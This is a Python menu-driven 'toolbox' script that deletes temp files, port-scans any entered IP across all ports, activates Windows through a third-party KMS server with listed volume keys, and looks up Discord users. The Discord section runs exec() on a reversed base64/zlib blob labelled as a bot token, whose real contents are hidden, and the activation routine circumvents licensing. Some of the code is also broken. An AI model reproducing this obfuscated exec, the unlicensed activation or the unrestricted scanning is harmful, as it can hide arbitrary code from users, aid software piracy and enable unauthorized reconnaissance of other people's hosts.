import os
import subprocess
import socket
import requests
import time
from datetime import datetime, timezone
from portscan import PortScan
from rgbprint import gradient_print, Color
while True:
    subprocess.run("cls", shell=True)

    gradient_print(
        r"""
            ███████╗███████╗██╗   ██╗███████╗ ██████╗ ██╗  ██╗    ████████╗ ██████╗  ██████╗ ██╗     ███████╗
            ╚══███╔╝██╔════╝╚██╗ ██╔╝██╔════╝██╔═══██╗╚██╗██╔╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
              ███╔╝ █████╗   ╚████╔╝ █████╗  ██║   ██║ ╚███╔╝        ██║   ██║   ██║██║   ██║██║     ███████╗
             ███╔╝  ██╔══╝    ╚██╔╝  ██╔══╝  ██║   ██║ ██╔██╗        ██║   ██║   ██║██║   ██║██║     ╚════██║
            ███████╗███████╗   ██║   ██║     ╚██████╔╝██╔╝ ██╗       ██║   ╚██████╔╝╚██████╔╝███████╗███████║
            ╚══════╝╚══════╝   ╚═╝   ╚═╝      ╚═════╝ ╚═╝  ╚═╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝

                                                            V1.0
    """, 
        start_color=Color.yellow, 
        end_color=Color.magenta
    )
    gradient_print(
        "[1] : Delete temporary files", 
        start_color=Color.magenta, 
        end_color=Color.yellow
    )
    gradient_print(
        "[2] : Check open ports", 
        start_color=Color.magenta, 
        end_color=Color.yellow
    )
    gradient_print(
        "[3] : Activate Windows", 
        start_color=Color.magenta, 
        end_color=Color.yellow
    )
    gradient_print(
        "[4] : Discord User Info",
        start_color=Color.magenta, 
        end_color=Color.yellow
    )
    choix = input("Select an option, or Q to exit:").strip().lower()
    if not choix:
        reponse = input("Nothing was entered. Do you want to leave the program? (Y/N): ")
        if reponse.lower() == "y":
            subprocess.run(["python", "main.py"])
            break
        else:
            continue

    if choix == "1":
        os.system("del /q /f /s %TEMP%\\*")
        print("Temporary files deleted.")
        input("Press a key to continue...")
        # C:\Users\Username\AppData\Local\Temp
    elif choix == "2":
        while True:
            subprocess.run("cls", shell=True)

            gradient_print(
                r"""
            ███████╗███████╗██╗   ██╗███████╗ ██████╗ ██╗  ██╗    ████████╗ ██████╗  ██████╗ ██╗     ███████╗
            ╚══███╔╝██╔════╝╚██╗ ██╔╝██╔════╝██╔═══██╗╚██╗██╔╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
              ███╔╝ █████╗   ╚████╔╝ █████╗  ██║   ██║ ╚███╔╝        ██║   ██║   ██║██║   ██║██║     ███████╗
             ███╔╝  ██╔══╝    ╚██╔╝  ██╔══╝  ██║   ██║ ██╔██╗        ██║   ██║   ██║██║   ██║██║     ╚════██║
            ███████╗███████╗   ██║   ██║     ╚██████╔╝██╔╝ ██╗       ██║   ╚██████╔╝╚██████╔╝███████╗███████║
            ╚══════╝╚══════╝   ╚═╝   ╚═╝      ╚═════╝ ╚═╝  ╚═╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝

                                                            V1.0
            """, 
                start_color=Color.yellow, 
                end_color=Color.magenta
            )
            gradient_print(
                "[1] : Your local IP", 
                start_color=Color.magenta, 
                end_color=Color.yellow
                )
            gradient_print(
                "[2] : Enter an IP address", 
                start_color=Color.magenta, 
                end_color=Color.yellow
            )
            choix = input("Select an option, or Q to exit: ").strip().lower()

            if not choix:
                reponse = input("Nothing was entered. Do you want to leave the program? (Y/N): ")
                if reponse.lower() == "y":
                    subprocess.run(["python", "main.py"])
                    break
                else:
                    continue
            if choix == "1":
                def get_local_ip():
                    hostname = socket.gethostname()
                    local_ip = socket.gethostbyname(hostname)
                    return local_ip
                
                ip = get_local_ip()
                port_range = '1-65535'
                scanner = PortScan(ip, port_range, thread_num=10000, show_refused=False, wait_time=0.5, stop_after_count=True)
                
                open_port_discovered = scanner.run()  # <----- actual scan
                if not open_port_discovered:
                    print("No open port was found.")
                input("Press a key to continue...")
            elif choix == "2":       
                while True:
                    subprocess.run("cls", shell=True)

                    gradient_print(
                        r"""
            ███████╗███████╗██╗   ██╗███████╗ ██████╗ ██╗  ██╗    ████████╗ ██████╗  ██████╗ ██╗     ███████╗
            ╚══███╔╝██╔════╝╚██╗ ██╔╝██╔════╝██╔═══██╗╚██╗██╔╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
              ███╔╝ █████╗   ╚████╔╝ █████╗  ██║   ██║ ╚███╔╝        ██║   ██║   ██║██║   ██║██║     ███████╗
             ███╔╝  ██╔══╝    ╚██╔╝  ██╔══╝  ██║   ██║ ██╔██╗        ██║   ██║   ██║██║   ██║██║     ╚════██║
            ███████╗███████╗   ██║   ██║     ╚██████╔╝██╔╝ ██╗       ██║   ╚██████╔╝╚██████╔╝███████╗███████║
            ╚══════╝╚══════╝   ╚═╝   ╚═╝      ╚═════╝ ╚═╝  ╚═╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝

                                                            V1.0
                    """, 
                        start_color=Color.yellow, 
                        end_color=Color.magenta
                    )
                    choix_ip = input("Enter an ip address (ex. 80.100.200.60) or exit with Enter: ").strip()
                    if choix_ip:
                        port_range = '1-65535'
                        scanner = PortScan(choix_ip, port_range, thread_num=10000, show_refused=False, wait_time=1, stop_after_count=True)
                        
                        open_port_discovered = scanner.run()  # <----- actual scan
                        if not open_port_discovered:
                            print("No open port was found.")
                    else:
                        print("No ip address was entered.")
                    input("Press a key to continue...")
            elif choix == "q":
                break
            else:
                print("Invalid choice. Select an option or Q to exit.")
    elif choix == 3:
        while True:
            kms_key = input("Enter a KMS key or exit with Enter: ").strip()

            if not kms_key:
                reponse = input("Nothing was entered. Do you want to leave the program? (Y/N): ")
                if reponse.lower() == "y":
                    subprocess.run(["python", "main.py"])
                    break
                else:
                    continue

        def activator():
            os.system(f'slmgr /ipk {kms_key}')

            # Configurer l'adresse du serveur KMS
            os.system('slmgr /skms kms.digiboy.ir')

            # Activer Windows
            os.system('slmgr /ato')

            # By Arizaki

            # Windows 10:
            # Windows 10 Pro : `W269N-WFGWX-YVC9B-4J6C9-T83GX`
            # Windows 10 Home : `TX9XD-98N7V-6WMQ6-BX7FG-H8Q99`
            # Windows 10 Pro N : `MH37W-N47XK-V7XM9-C7227-GCQG9`
            # Windows 10 Home N : `3KHY7-WNT83-DGQKR-F7HPR-844BM`
            # Windows 10 Education : `NW6C2-QMPVW-D7KKK-3GKT6-VCFB2`
            # Windows 10 Enterprise : `NPPR9-FWDCX-D2C8J-H872K-2YT43`

            # Windows 11:
            # Windows 11 Pro : `VK7JG-NPHTM-C97JM-9MPGT-3V66T`
            # Windows 11 Home : `T96YJ-W9QGK-WBK44-2WQBR-BXJDY`
            # Windows 11 Pro N : `9FNHH-K3HBT-3W4TD-6383H-6XYWF`
            # Windows 11 Enterprise : `FPHH3-HNDR3-M8RMG-7DZFW-VV2TR`
            activator()

    elif choix == "4":
        while True:
            subprocess.run("cls", shell=True)

            gradient_print(
                r"""
            ███████╗███████╗██╗   ██╗███████╗ ██████╗ ██╗  ██╗    ████████╗ ██████╗  ██████╗ ██╗     ███████╗
            ╚══███╔╝██╔════╝╚██╗ ██╔╝██╔════╝██╔═══██╗╚██╗██╔╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
              ███╔╝ █████╗   ╚████╔╝ █████╗  ██║   ██║ ╚███╔╝        ██║   ██║   ██║██║   ██║██║     ███████╗
             ███╔╝  ██╔══╝    ╚██╔╝  ██╔══╝  ██║   ██║ ██╔██╗        ██║   ██║   ██║██║   ██║██║     ╚════██║
            ███████╗███████╗   ██║   ██║     ╚██████╔╝██╔╝ ██╗       ██║   ╚██████╔╝╚██████╔╝███████╗███████║
            ╚══════╝╚══════╝   ╚═╝   ╚═╝      ╚═════╝ ╚═╝  ╚═╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝

                                                            V1.0
            """, 
                start_color=Color.yellow, 
                end_color=Color.magenta
            )

            discord_user_id = input("Enter an user id (ex. 693135745925382166) or exit with Q: ").strip()

            if not discord_user_id:
                response = input("Nothing was entered. Do you want to leave the program? (Y/N): ")
                if response.lower() == "y":
                    subprocess.run(["python", "main.py"])
                    break
                else:
                    continue
            elif discord_user_id == "q":
                break
            def get_badges(flags):
                badges = []
                badges_map = {
                    1: "Staff",
                    2: "Partner",
                    4: "Hypesquad Event",
                    8: "Green Bughunter",
                    64: "Hypesquad Bravery",
                    128: "HypeSquad Brilliance",
                    256: "HypeSquad Balance",
                    512: "Early Supporter",
                    16384: "Gold BugHunter",
                    131072: "Verified Bot Developer"
                }

                for flag, badge in badges_map.items():
                    if flags & flag:
                        badges.append(badge)
                return badges

            def get_creation_date(user_id):
                timestamp = ((int(user_id) >> 22) + 1420070400000) / 1000
                creation_date = datetime.fromtimestamp(timestamp, tz=timezone.utc)
                return creation_date

            # Python obfuscation by freecodingtools.org (bot token)
            _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))

            headers = {
                'Authorization': f'Bot {discord_token}',
            }

            response = requests.get(f'https://discord.com/api/v10/users/{discord_user_id}', headers=headers)
            user_info = response.json()
            if response.status_code == 200:
                # print(user_info)
                print(f"Username: \033[95m{user_info['username']}\033[0m")
                print(f"Global name: \033[95m{user_info['global_name']}\033[0m")
                print(f"ID: \033[95m{user_info['id']}\033[0m")
                print(f"Creation date: \033[95m{get_creation_date(user_info['id'])}\033[0m")
                print(f"Avatar: \033[95mhttps://cdn.discordapp.com/avatars/{user_info['id']}/{user_info['avatar']}.png?size=512\033[0m")
                print(f"Avatart decoration: \033[95mhttps://cdn.discordapp.com/avatar-decoration-presets/{user_info['avatar_decoration_data']['asset']}\033[0m")

                num_badges = get_badges(user_info['public_flags'])
                if len(num_badges) == 1:
                    print(f"Badge : \033[95m{', '.join(num_badges)}\033[0m")
                else:
                    print(f"Badges : \033[95m{', '.join(num_badges)}\033[0m")
            else:
                print(f"\033[91mUnkown User ID.\033[0m")
                time.sleep(1)
                continue
            input("Press a key to continue...")


    elif choix == "q":
        subprocess.run(["python", "main.py"])
        break
    else:
        print("Invalid choice. Select an option or Q to exit.")




